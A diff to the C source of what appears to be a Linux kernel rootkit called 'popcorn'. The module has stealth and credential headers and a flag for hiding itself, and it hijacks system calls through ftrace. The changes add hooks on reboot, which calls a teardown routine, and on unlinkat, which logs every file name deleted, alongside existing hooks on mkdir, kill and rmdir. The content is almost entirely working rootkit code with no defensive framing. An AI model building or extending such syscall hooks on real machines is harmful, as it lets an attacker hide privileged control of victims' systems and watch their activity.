@@ -1,6 +1,7 @@
 #include "../headers/hooks.h"
 #include "../headers/credentials.h"
 #include "../headers/stealth.h"
+#include "../headers/popcorn.h"
 
 static short lkm_hidden = 0;
 
@@ -56,6 +57,28 @@ asmlinkage int pn_rmdir(const struct pt_regs *regs) {
     return 0;
 }
 
+asmlinkage int pn_reboot(const struct pt_regs *regs) {
+
+    teardown();
+
+    lx_reboot(regs);
+    return 0;
+}
+
+asmlinkage int pn_unlinkat(const struct pt_regs *regs) {
+    char __user *pathname = (char *)regs->di;
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+    
+    if (error > 0) {
+        printk(KERN_INFO "Unlinkat Test: \"%s\".\n", dir_name);
+    }
+
+    lx_unlinkat(regs);
+    return 0;
+}
+
 #else
 
 // Define popcorn mkdir function call, for non-"pt-regs" versions of the kernel
@@ -102,6 +125,27 @@ asmlinkage int pn_rmdir(const char __user *pathname) {
     return 0;
 }
 
+asmlinkage int pn_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg) {
+
+    teardown();
+
+    lx_reboot(magic1, magic2, cmd, arg);
+    return 0;
+}
+
+asmlinkage int pn_unlinkat(int dfd, const char __user * pathname, int flag) {
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+    
+    if (error > 0) {
+        printk(KERN_INFO "Unlinkat Test: \"%s\".\n", dir_name);
+    }
+
+    lx_unlinkat(dfd, pathname, flag);
+    return 0;
+}
+
 #endif
 
 // Define ftrace kernel hooks
@@ -109,6 +153,8 @@ static struct ftrace_hook kernel_hooks[] = {
     // Swap The sys_mkdir call from linux to popcorn method...
     HOOK("__x64_sys_mkdir", pn_mkdir, &lx_mkdir),
     HOOK("__x64_sys_kill", pn_kill, &lx_kill),
-    HOOK("__x64_sys_rmdir", pn_rmdir, &lx_rmdir)
+    HOOK("__x64_sys_rmdir", pn_rmdir, &lx_rmdir),
+    HOOK("__x64_sys_reboot", pn_reboot, &lx_reboot),
+    HOOK("__x64_sys_unlinkat", pn_unlinkat, &lx_unlinkat)
 
 };
